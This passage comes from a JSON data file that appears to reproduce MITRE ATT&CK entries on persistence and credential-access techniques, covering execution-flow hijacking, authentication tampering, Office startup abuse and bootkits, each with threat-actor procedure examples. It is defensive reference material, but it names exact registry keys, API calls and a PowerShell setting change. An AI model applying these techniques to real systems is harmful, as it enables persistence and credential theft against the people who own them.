Registry tree to point to a malicious DLL.[6]Adversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.[5][7] Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.[2]",
                "Procedure": {
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the svchost.exe process.[8]"
                    }
                }
            },
            "012": {
                "name": "COR_PROFILER",
                "href": "/techniques/T1574/012",
                "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.[1][2]The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.[2]Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.[3][4][5][6][7]",
                "Procedure": {
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.[3]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active.[8]"
                    }
                }
            },
            "013": {
                "name": "KernelCallbackTable",
                "href": "/techniques/T1574/013",
                "description": "Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads.[1][2] The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.[3]An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function).[4] Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.[1]The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload.[1] Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
                "Procedure": {
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created Asynchronous Procedure Call stub routine.[2]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has abused the KernelCallbackTable to hijack process control flow and execute shellcode.[1][5]"
                    }
                }
            },
            "014": {
                "name": "AppDomainManager",
                "href": "/techniques/T1574/014",
                "description": "Adversaries may execute their own malicious payloads by hijacking how the .NET AppDomainManager loads assemblies. The .NET framework uses the AppDomainManager class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exe or .dll binaries compiled to run as .NET code) may be loaded into an application domain as executable code.[1] Known as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.[2][3][4]",
                "Procedure": {}
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
        "Procedure": {
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.[1]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware will remove and write malicious shared objects associated with legitimate system functions such as read(2).[2]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware edits the Registry key HKCU\\Software\\Classes\\mscfile\\shell\\open\\command to execute a malicious AutoIt script.[3] When eventvwr.exe is executed, this will call the Microsoft Management Console (mmc.exe), which in turn references the modified Registry key."
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware replaces the nonexistent Windows DLL \"msfte.dll\" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.[4]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "One of malware can replace the normal flow of a program execution with malicious code.[5]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware can hijack the cryptbase.dll within migwiz.exe to escalate privileges and bypass UAC controls.[6]"
            }
        }
    },
    "T1525": {
        "ttp_name": "Implant Internal Image",
        "ttp_id": "T1525",
        "href": "/techniques/T1525",
        "tactic": "Persistence",
        "description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim\u2019s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.[1]A tool has been developed to facilitate planting backdoors in cloud container images.[2] If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a Web Shell.[1]",
        "Procedure": {}
    },
    "T1556": {
        "ttp_name": "Modify Authentication Process",
        "ttp_id": "T1556",
        "href": "/techniques/T1556",
        "subtechnique": {
            "001": {
                "name": "Domain Controller Authentication",
                "href": "/techniques/T1556/001",
                "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.[1]",
                "Procedure": {
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name>'s malware has altered the NTLM authentication program on domain controllers to allow <name> to login without a valid credential.[2]"
                    },
                    "S0007": {
                        "ID": "S0007",
                        "Name": "Skeleton Key",
                        "Description": "<name> is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller.[1]"
                    }
                }
            },
            "002": {
                "name": "Password Filter DLL",
                "href": "/techniques/T1556/002",
                "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.[1]",
                "Procedure": {
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> harvests plain-text credentials as a password filter registered on domain controllers.[2]"
                    },
                    "G0041": {
                        "ID": "G0041",
                        "Name": "Strider",
                        "Description": "<name> has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.[2]"
                    }
                }
            },
            "003": {
                "name": "Pluggable Authentication Modules",
                "href": "/techniques/T1556/003",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.[1][2][3]Adversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.[4]Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.[5][1]",
                "Procedure": {
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> can deactivate PAM modules to tamper with the sshd configuration.[6]"
                    },
                    "S0468": {
                        "ID": "S0468",
                        "Name": "Skidmap",
                        "Description": "<name> has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.[7]"
                    }
                }
            },
            "004": {
                "name": "Network Device Authentication",
                "href": "/techniques/T1556/004",
                "description": "Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.Modify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.[1]",
                "Procedure": {
                    "S1104": {
                        "ID": "S1104",
                        "Name": "SLOWPULSE",
                        "Description": "<name> can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password.[2]"
                    },
                    "S0519": {
                        "ID": "S0519",
                        "Name": "SYNful Knock",
                        "Description": "<name> has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device.[1]"
                    }
                }
            },
            "005": {
                "name": "Reversible Encryption",
                "href": "/techniques/T1556/005",
                "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.[1]If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:Encrypted password (G$RADIUSCHAP) from the Active Directory user-structure userParameters16 byte randomly-generated value (G$RADIUSCHAPKEY) also from userParametersGlobal LSA secret (G$MSRADIUSCHAPKEY)Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.[2][3]An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.[4] In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.",
                "Procedure": {}
            },
            "006": {
                "name": "Multi-Factor Authentication",
                "href": "/techniques/T1556/006",
                "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.[1][2]For example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. [3] Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.[3]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "The <name> Set-AADIntUserMFA command can be used to disable MFA for a specified user."
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "After compromising user accounts, <name> registers their own MFA tokens.[4]"
                    },
                    "S1104": {
                        "ID": "S1104",
                        "Name": "SLOWPULSE",
                        "Description": "<name> can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided.[5]"
                    }
                }
            },
            "007": {
                "name": "Hybrid Identity",
                "href": "/techniques/T1556/007",
                "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD[1]:Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the AzureADConnectAuthenticationAgentService process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.[2][3] In environments using AD FS, an adversary may edit the Microsoft.IdentityServer.Servicehost configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.[4]In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.[5]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can inject a malicious DLL (PTASpy) into the AzureADConnectAuthenticationAgentService to backdoor Azure AD Pass-Through Authentication.[3]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has edited the Microsoft.IdentityServer.Servicehost.exe.config file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name.[4]"
                    }
                }
            },
            "008": {
                "name": "Network Provider DLL",
                "href": "/techniques/T1556/008",
                "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.[1] During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.[2][3][4] Adversaries can configure a malicious network provider DLL to receive credentials from mpnotify.exe.[5] Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the NPLogonNotify() function.[4]Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.[2]",
                "Procedure": {}
            },
            "009": {
                "name": "Conditional Access Policies",
                "href": "/techniques/T1556/009",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.For example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.[1][2][3] In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain condition attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.[4][5] These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. By modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "Procedure": {
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> has added additional trusted locations to Azure AD conditional access policies. [6]"
                    }
                }
            }
        },
        "tactic": "Credential Access",
        "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
        "Procedure": {
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware can intercept private keys using a trojanized ssh-add function.[1]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.[2]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware has trojanized the ssh_login and user-auth_pubkey functions to steal plaintext credentials.[3]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.[4]"
            }
        }
    },
    "T1137": {
        "ttp_name": "Office Application Startup",
        "ttp_id": "T1137",
        "href": "/techniques/T1137",
        "subtechnique": {
            "001": {
                "name": "Office Template Macros",
                "href": "/techniques/T1137/001",
                "description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. [1]Office Visual Basic for Applications (VBA) macros [2] can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.[3][4] Shared templates may also be stored and pulled from remote locations.[5] Word Normal.dotm location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotmExcel Personal.xlsb location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSBAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.[5] An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
                "Procedure": {
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.[6]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission.[7]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used a Word Template, Normal.dotm, for persistence.[8]"
                    }
                }
            },
            "002": {
                "name": "Office Test",
                "href": "/techniques/T1137/002",
                "description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.[1][2]There exist user and global Registry keys for the Office Test feature, such as:HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\PerfHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\PerfAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\\Software\\Microsoft\\Office test\\Special\\Perf to execute code.[2]"
                    }
                }
            },
            "003": {
                "name": "Outlook Forms",
                "href": "/techniques/T1137/003",
                "description": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.[1]Once malicious forms have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.[1]",
                "Procedure": {
                    "S0358": {
                        "ID": "S0358",
                        "Name": "Ruler",
                        "Description": "<name> can be used to automate the abuse of Outlook Forms to establish persistence.[2]"
                    }
                }
            },
            "004": {
                "name": "Outlook Home Page",
                "href": "/techniques/T1137/004",
                "description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.[1]Once malicious home pages have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.[1]",
                "Procedure": {
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has abused the Outlook Home Page feature for persistence. <name> has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.[2]"
                    },
                    "S0358": {
                        "ID": "S0358",
                        "Name": "Ruler",
                        "Description": "<name> can be used to automate the abuse of Outlook Home Pages to establish persistence.[3]"
                    }
                }
            },
            "005": {
                "name": "Outlook Rules",
                "href": "/techniques/T1137/005",
                "description": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.[1]Once malicious rules have been added to the user\u2019s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.[1]",
                "Procedure": {
                    "S0358": {
                        "ID": "S0358",
                        "Name": "Ruler",
                        "Description": "<name> can be used to automate the abuse of Outlook Rules to establish persistence.[2]"
                    }
                }
            },
            "006": {
                "name": "Add-ins",
                "href": "/techniques/T1137/006",
                "description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. [1] There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. [2][3]Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.",
                "Procedure": {
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has been loaded through a .wll extension added to the %APPDATA%\\microsoft\\word\\startup\\ repository.[4]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host.[5]"
                    }
                }
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.[1] These persistence mechanisms can work within Outlook or be used through Office 365.[2]",
        "Procedure": {
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.[3][4]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has inserted malicious macros into existing documents, providing persistence when they are reopened. malware has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received.[5]"
            }
        }
    },
    "T1653": {
        "ttp_name": "Power Settings",
        "ttp_id": "T1653",
        "href": "/techniques/T1653",
        "tactic": "Persistence",
        "description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.[1]Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.[2][3]For example, powercfg controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.[4] Adversaries may also extend system lock screen timeout settings.[5] Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.[6]Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.[7]",
        "Procedure": {}
    },
    "T1542": {
        "ttp_name": "Pre-OS Boot",
        "ttp_id": "T1542",
        "href": "/techniques/T1542",
        "subtechnique": {
            "001": {
                "name": "System Firmware",
                "href": "/techniques/T1542/001",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.[1][2][3]System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "Procedure": {
                    "S0047": {
                        "ID": "S0047",
                        "Name": "Hacking Team UEFI Rootkit",
                        "Description": "<name> is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.[4]"
                    },
                    "S0397": {
                        "ID": "S0397",
                        "Name": "LoJax",
                        "Description": "<name> is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.[5]"
                    },
                    "S0001": {
                        "ID": "S0001",
                        "Name": "Trojan.Mebromi",
                        "Description": "<name> performs BIOS modification and can download and execute a file as well as protect itself from removal.[6]"
                    }
                }
            },
            "002": {
                "name": "Component Firmware",
                "href": "/techniques/T1542/002",
                "description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "Procedure": {
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> has maintained persistence by patching legitimate device firmware when it is downloaded, including that of WatchGuard devices.[1]"
                    },
                    "G0020": {
                        "ID": "G0020",
                        "Name": "Equation",
                        "Description": "<name> is known to have the capability to overwrite the firmware on hard drives from some manufacturers.[2]"
                    }
                }
            },
            "003": {
                "name": "Bootkit",
                "href": "/techniques/T1542/003",
                "description": "Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). [1] The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. [2]The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.[3]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.[4]"
                    },
                    "S0114": {
                        "ID": "S0114",
                        "Name": "BOOTRASH",
                        "Description": "<name> is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.[1][5][6]"
                    },
                    "S0484": {
